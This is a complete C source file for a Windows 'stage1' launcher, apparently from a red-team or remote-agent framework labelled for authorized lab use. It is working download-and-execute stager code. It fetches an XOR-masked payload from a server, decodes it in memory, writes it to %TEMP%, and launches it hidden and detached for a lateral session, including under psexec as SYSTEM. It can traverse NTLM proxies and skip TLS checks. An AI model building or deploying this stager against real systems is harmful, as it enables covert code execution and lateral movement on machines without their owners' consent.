/*
 * stage1.c - Minimal WinHTTP stage1 launcher (authorized lab use only).
 *
 * Standalone launcher. The dedicated lateral-service host also compiles this
 * worker code into its own binary. Stage1 carries no beacon secret: its only
 * credential is the unguessable staging identifier on its command line.  It
 * fetches the masked stage2 payload from the RMM staging endpoint, decodes it
 * in memory, writes the agent to disk, launches it, and exits so the caller
 * can complete its deployment lifecycle.
 *
 * Build (cross-compile from Linux, authorized lab use only):
 *
 *   x86_64-w64-mingw32-gcc -Os -s -mwindows \
 *       -DBASE_URL=L"https://10.0.0.1:8443" \
 *       [-DSTAGE1_INSECURE] \
 *       -o stage1.exe stage1.c -lwinhttp -lbcrypt -lshell32
 *
 * Arguments:
 *   --stage   <32-char hex staging id>
 *   --session <target session id>
 *   --debug-stage-filename 1 (internal service worker filename selection)
 *
 * Flow:
 *   1. GET {BASE_URL}/tools/stage/{staging_id}
 *      - System/IE proxy  (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY)
 *      - NTLM proxy auth  (WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW)
 *      - HTTP 200 required; anything else is a clear error, not a payload
 *   2. XOR-decode with SHA-256 counter keystream seeded by staging_id
 *   3. Verify MZ header
 *   4. Write to %TEMP%\minimal-rmm-agent.exe (user-writable, no elevation)
 *   5. CreateProcessW detached: minimal-rmm-agent.exe --lateral-session <id>
 *
 * Diagnostics: when started from a console (cmd.exe), stage1 attaches to the
 * parent console and prints its progress and errors; SCM and Explorer
 * launches stay silent. Exit codes: 0 = agent started, 1 = staging failure,
 * 2 = invalid arguments or base URL.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <shellapi.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")

/* BASE_URL is injected by the server build as a wide string literal, e.g.:
 *   -DBASE_URL=L"https://10.0.0.1:8443"
 * When no URL is embedded (placeholder build), stage1 returns an error. */
#ifndef BASE_URL
#define BASE_URL L""
#endif

/* Define STAGE1_INSECURE to disable TLS certificate validation.
 * Required in lab environments that use self-signed certificates. */
#ifndef STAGE1_INSECURE
#define STAGE1_INSECURE 0
#endif

/* WINHTTP_OPTION_AUTOLOGON_SECURITY_LEVEL (0x80) is absent from some MinGW
 * winhttp.h versions; define it manually. The numeric value is stable across
 * all Windows versions that ship WinHTTP. */
#ifndef WINHTTP_OPTION_AUTOLOGON_SECURITY_LEVEL
#define WINHTTP_OPTION_AUTOLOGON_SECURITY_LEVEL 128
#endif

/* Maximum payload size accepted: 32 MiB */
#define MAX_PAYLOAD_BYTES (32u * 1024u * 1024u)

/* Optional console diagnostics. stage1 is a GUI-subsystem binary, so a manual
 * run from cmd.exe gives it no console and every failure used to look like
 * "nothing happened". Attach to the parent console when one exists (manual
 * runs from a terminal); SCM (psexec) and Explorer launches stay silent. */
static HANDLE g_console = INVALID_HANDLE_VALUE;

static void consoleAttach(void) {
    if (AttachConsole(ATTACH_PARENT_PROCESS))
        g_console = CreateFileW(L"CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE,
                                NULL, OPEN_EXISTING, 0, NULL);
}

static void consolePrint(const char *msg) {
    if (g_console == INVALID_HANDLE_VALUE) return;
    int n = lstrlenA(msg);
    if (n > 500) n = 500;
    char line[512];
    CopyMemory(line, msg, n);
    line[n] = '\r';
    line[n + 1] = '\n';
    DWORD written;
    WriteFile(g_console, line, (DWORD)(n + 2), &written, NULL);
}

/* Staging-id alphabet check: same as the Go stagingTokenPattern */
static int validStagingChar(wchar_t c) {
    return (c >= L'0' && c <= L'9') ||
           (c >= L'a' && c <= L'z') ||
           (c >= L'A' && c <= L'Z') ||
           c == L'-' || c == L'_';
}

static int validStagingID(const wchar_t *id) {
    int n = 0;
    while (id[n]) {
        if (!validStagingChar(id[n])) return 0;
        n++;
    }
    return n >= 8 && n <= 128;
}

/* Convert wide string to newly-HeapAlloc'd narrow string (ASCII-safe). */
static char *narrow(const wchar_t *w) {
    int n = WideCharToMultiByte(CP_ACP, 0, w, -1, NULL, 0, NULL, NULL);
    if (n <= 0) return NULL;
    char *s = (char *)HeapAlloc(GetProcessHeap(), 0, n);
    if (!s) return NULL;
    WideCharToMultiByte(CP_ACP, 0, w, -1, s, n, NULL, NULL);
    return s;
}

/*
 * stageMask — reproduce the Python/Go staging mask.
 *
 * For each 32-byte block at byte offset `off`:
 *   seed  = stagingID_bytes || big_endian_uint64(off / 32)
 *   block = SHA-256(seed)
 *   data[off .. off+32] ^= block
 *
 * Uses BCrypt for SHA-256 so there is no dependency on a CRT hash library.
 */
static BOOL stageMask(BYTE *data, DWORD dataLen, const char *stagingID) {
    int idLen = lstrlenA(stagingID);
    if (idLen <= 0 || idLen > 200) return FALSE;

    DWORD seedLen = (DWORD)(idLen + 8);
    BYTE *seed = (BYTE *)HeapAlloc(GetProcessHeap(), 0, seedLen);
    if (!seed) return FALSE;
    CopyMemory(seed, stagingID, idLen);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg,
            BCRYPT_SHA256_ALGORITHM, NULL, 0))) {
        HeapFree(GetProcessHeap(), 0, seed);
        return FALSE;
    }

    BOOL ok = TRUE;
    for (DWORD off = 0; off < dataLen; off += 32) {
        /* Encode big-endian uint64 block index into seed[idLen..idLen+8] */
        UINT64 idx = (UINT64)(off / 32);
        for (int b = 0; b < 8; b++)
            seed[idLen + b] = (BYTE)((idx >> (56 - b * 8)) & 0xFF);

        BCRYPT_HASH_HANDLE hHash = NULL;
        if (!BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0))) {
            ok = FALSE;
            break;
        }
        BCryptHashData(hHash, seed, seedLen, 0);
        BYTE block[32];
        BCryptFinishHash(hHash, block, 32, 0);
        BCryptDestroyHash(hHash);

        DWORD end = off + 32;
        if (end > dataLen) end = dataLen;
        for (DWORD i = off; i < end; i++)
            data[i] ^= block[i - off];
    }

    BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, seed);
    return ok;
}

/* -------------------------------------------------------------------------
 * WinHTTP helpers
 * ------------------------------------------------------------------------- */

/*
 * CrackURL — split a URL into host (port included if non-default), path,
 * port number, and scheme flags.  Returns FALSE on failure.
 */
static BOOL crackURL(const wchar_t *url,
                     wchar_t *host, DWORD hostBuf,
                     wchar_t *path, DWORD pathBuf,
                     INTERNET_PORT *port,
                     DWORD *scheme) {
    URL_COMPONENTS uc;
    ZeroMemory(&uc, sizeof(uc));
    uc.dwStructSize      = sizeof(uc);
    uc.lpszHostName      = host;
    uc.dwHostNameLength  = hostBuf;
    uc.lpszUrlPath       = path;
    uc.dwUrlPathLength   = pathBuf;

    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return FALSE;
    *port   = uc.nPort;
    *scheme = (uc.nScheme == INTERNET_SCHEME_HTTPS)
              ? WINHTTP_FLAG_SECURE : 0;
    return TRUE;
}

/* Send an HTTP request and return the response body in a HeapAlloc'd buffer.
 * *outLen receives the byte count and *outStatus the HTTP status code.
 * Returns NULL on transport failure. */
static BYTE *httpRequest(HINTERNET hSession,
                         const wchar_t *host, INTERNET_PORT port,
                         DWORD secFlag,
                         const wchar_t *method,
                         const wchar_t *path,
                         const void *body, DWORD bodyLen,
                         const wchar_t *contentType,
                         DWORD *outLen, DWORD *outStatus) {
    *outStatus = 0;
    HINTERNET hConn = WinHttpConnect(hSession, host, port, 0);
    if (!hConn) return NULL;

    HINTERNET hReq = WinHttpOpenRequest(hConn, method, path,
                                        NULL, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        secFlag);
    if (!hReq) { WinHttpCloseHandle(hConn); return NULL; }

#if STAGE1_INSECURE
    /* Skip TLS certificate validation — lab self-signed certs only */
    DWORD tlsFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA     |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS,
                     &tlsFlags, sizeof(tlsFlags));
#endif

    /* Allow auto-NTLM/Kerberos on the proxy so we traverse auth'd proxies */
    DWORD authLevel = WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW;
    WinHttpSetOption(hReq, WINHTTP_OPTION_AUTOLOGON_SECURITY_LEVEL,
                     &authLevel, sizeof(authLevel));

    BOOL sent = WinHttpSendRequest(hReq,
                    contentType ? contentType : WINHTTP_NO_ADDITIONAL_HEADERS,
                    contentType ? (DWORD)-1L : 0,
                    (LPVOID)body, bodyLen, bodyLen,
                    0);
    if (!sent || !WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
        return NULL;
    }

    /* Record the HTTP status so callers can reject error pages instead of
     * trying to decode them as the stage2 payload. */
    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hReq,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX,
                        &statusCode, &statusSize,
                        WINHTTP_NO_HEADER_INDEX);
    *outStatus = statusCode;

    /* Read response body into a growable HeapAlloc buffer */
    DWORD cap = 65536, used = 0;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, cap);
    if (!buf) { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); return NULL; }

    while (1) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(hReq, &avail) || avail == 0) break;
        if (used + avail > MAX_PAYLOAD_BYTES) { HeapFree(GetProcessHeap(), 0, buf); buf = NULL; break; }
        if (used + avail > cap) {
            DWORD newCap = (cap * 2 > used + avail) ? cap * 2 : used + avail + 65536;
            BYTE *nb = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, buf, newCap);
            if (!nb) { HeapFree(GetProcessHeap(), 0, buf); buf = NULL; break; }
            buf = nb; cap = newCap;
        }
        DWORD got = 0;
        if (!WinHttpReadData(hReq, buf + used, avail, &got)) {
            HeapFree(GetProcessHeap(), 0, buf); buf = NULL; break;
        }
        used += got;
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    if (buf) *outLen = used;
    return buf;
}

/* -------------------------------------------------------------------------
 * Main logic
 * ------------------------------------------------------------------------- */

/*
 * doStage — fetch, decode, write, and launch the agent.
 * Returns NULL on success, or a static error string on failure.
 */
static const char *doStage(HINTERNET hSession,
                            const wchar_t *host, INTERNET_PORT port,
                            DWORD secFlag,
                            const wchar_t *stagePath,
                            const wchar_t *stageIDW,
                            const wchar_t *sessionIDW,
                            BOOL debugAgent) {
    /* 1. Fetch the masked stage2 payload */
    DWORD payloadLen = 0, httpStatus = 0;
    BYTE *payload = httpRequest(hSession, host, port, secFlag,
                                L"GET", stagePath,
                                NULL, 0, NULL,
                                &payloadLen, &httpStatus);
    if (!payload) return "stage2 download failed";
    if (httpStatus != 200) {
        HeapFree(GetProcessHeap(), 0, payload);
        if (httpStatus == 404)
            return "stage2 download failed: HTTP 404 (staging entry unknown, already fetched, or expired)";
        return "stage2 download failed: HTTP status not 200";
    }
    if (payloadLen < 2) { HeapFree(GetProcessHeap(), 0, payload); return "stage2 payload empty"; }

    /* 2. Decode: XOR with SHA-256 counter keystream */
    char *stageID = narrow(stageIDW);
    if (!stageID) { HeapFree(GetProcessHeap(), 0, payload); return "staging id conversion failed"; }

    if (!stageMask(payload, payloadLen, stageID)) {
        HeapFree(GetProcessHeap(), 0, stageID);
        HeapFree(GetProcessHeap(), 0, payload);
        return "payload decode failed";
    }
    HeapFree(GetProcessHeap(), 0, stageID);

    /* 3. Verify MZ header */
    if (payload[0] != 'M' || payload[1] != 'Z') {
        HeapFree(GetProcessHeap(), 0, payload);
        return "stage2 integrity check failed (not MZ)";
    }

    /* 4. Write to %TEMP%\minimal-rmm-agent.exe — user-writable, so a manual
     * launcher run needs no administrator rights (the psexec path runs as
     * SYSTEM, whose temp directory is writable as well). */
    wchar_t tmpDir[MAX_PATH];
    DWORD tmpLen = GetTempPathW(MAX_PATH, tmpDir);
    if (!tmpLen)
        lstrcpyW(tmpDir, L"C:\\Windows\\Temp\\");
    else if (tmpLen >= MAX_PATH) {
        HeapFree(GetProcessHeap(), 0, payload);
        return "temporary directory path too long";
    }

    const wchar_t *agentName = debugAgent ? L"minimal-rmm-agent-debug.exe"
                                         : L"minimal-rmm-agent.exe";
    if (lstrlenW(tmpDir) + lstrlenW(agentName) >= MAX_PATH) {
        HeapFree(GetProcessHeap(), 0, payload);
        return "agent binary path too long";
    }

    wchar_t agentPath[MAX_PATH];
    lstrcpyW(agentPath, tmpDir);
    lstrcatW(agentPath, agentName);

    HANDLE hFile = CreateFileW(agentPath,
                               GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, payload);
        return "failed to write agent binary";
    }
    DWORD written;
    BOOL writeOk = WriteFile(hFile, payload, payloadLen, &written, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, payload);
    if (!writeOk || written != payloadLen) return "failed to write agent binary (incomplete)";

    /* 5. Launch detached: minimal-rmm-agent.exe --lateral-session <session_id> */
    wchar_t cmdLine[MAX_PATH + 192];
    lstrcpyW(cmdLine, L"\"");
    lstrcatW(cmdLine, agentPath);
    lstrcatW(cmdLine, L"\" --lateral-session ");
    lstrcatW(cmdLine, sessionIDW);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL launched = CreateProcessW(agentPath, cmdLine, NULL, NULL,
                                   FALSE,
                                   CREATE_NO_WINDOW | DETACHED_PROCESS |
                                   CREATE_NEW_PROCESS_GROUP,
                                   NULL, NULL, &si, &pi);
    if (!launched) return "failed to start agent process";
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    {
        char *pathText = narrow(agentPath);
        if (pathText) {
            consolePrint("stage1: agent started");
            consolePrint(pathText);
            HeapFree(GetProcessHeap(), 0, pathText);
        }
    }
    return NULL; /* success */
}

/* -------------------------------------------------------------------------
 * Entry point
 * ------------------------------------------------------------------------- */
static int runLauncher(void) {
    consoleAttach();

    const wchar_t *baseURL = BASE_URL;

    /* Parse command-line arguments */
    int argc;
    LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv) {
        consolePrint("stage1: command line parsing failed");
        return 2;
    }

    wchar_t stageID[256]   = {0};
    wchar_t sessionID[256] = {0};
    wchar_t customURL[2048] = {0};
    BOOL debugAgent = FALSE;
    BOOL invalidDebugAgent = FALSE;

    for (int i = 1; i + 1 < argc; i += 2) {
        if (lstrcmpW(argv[i], L"--stage") == 0)
            lstrcpynW(stageID, argv[i + 1], 255);
        else if (lstrcmpW(argv[i], L"--session") == 0)
            lstrcpynW(sessionID, argv[i + 1], 255);
        else if (lstrcmpW(argv[i], L"--base-url") == 0)
            lstrcpynW(customURL, argv[i + 1], 2047);
        else if (lstrcmpW(argv[i], L"--debug-stage-filename") == 0) {
            if (lstrcmpW(argv[i + 1], L"1") != 0) invalidDebugAgent = TRUE;
            else debugAgent = TRUE;
        }
    }
    LocalFree(argv);

    if (invalidDebugAgent) {
        consolePrint("stage1: --debug-stage-filename requires 1");
        return 2;
    }

    if (customURL[0] != L'\0') baseURL = customURL;
    if (!baseURL || baseURL[0] == L'\0') {
        consolePrint("stage1: no base URL embedded; rebuild through the RMM server");
        return 2;
    }

    if (!validStagingID(stageID) || !validStagingID(sessionID)) {
        consolePrint("stage1: missing or invalid --stage/--session arguments");
        return 2;
    }

    /* Crack base URL into host + path components */
    wchar_t host[512], basePath[1024];
    INTERNET_PORT port;
    DWORD secFlag;
    if (!crackURL(baseURL, host, 512, basePath, 1024, &port, &secFlag)) {
        consolePrint("stage1: invalid base URL");
        return 2;
    }

    /* Build staging path: basePath + /tools/stage/ + stageID */
    wchar_t stagePath[1280];
    /* Strip trailing slash from basePath */
    int bpLen = lstrlenW(basePath);
    while (bpLen > 0 && basePath[bpLen - 1] == L'/') basePath[--bpLen] = L'\0';
    lstrcpyW(stagePath, basePath);
    lstrcatW(stagePath, L"/tools/stage/");
    lstrcatW(stagePath, stageID);

    /* Open WinHTTP session with system proxy */
    HINTERNET hSession = WinHttpOpen(
        L"minimal-rmm-stage1/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) {
        consolePrint("stage1: WinHTTP initialization failed");
        return 1;
    }

    {
        char *urlText = narrow(baseURL);
        if (urlText) {
            consolePrint(urlText);
            HeapFree(GetProcessHeap(), 0, urlText);
        }
    }

    const char *err = doStage(hSession, host, port, secFlag,
                               stagePath, stageID, sessionID, debugAgent);
    char statusMsg[320];
    if (err) {
        lstrcpyA(statusMsg, "stage1 failed: ");
        lstrcatA(statusMsg, err);
        consolePrint(statusMsg);
    } else {
        lstrcpyA(statusMsg, "stage1 ok: agent installed and started");
        consolePrint(statusMsg);
    }
    WinHttpCloseHandle(hSession);
    return err ? 1 : 0;
}


#ifndef STAGE1_EMBEDDED
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInst; (void)hPrev; (void)lpCmdLine; (void)nShowCmd;
    return runLauncher();
}
#endif
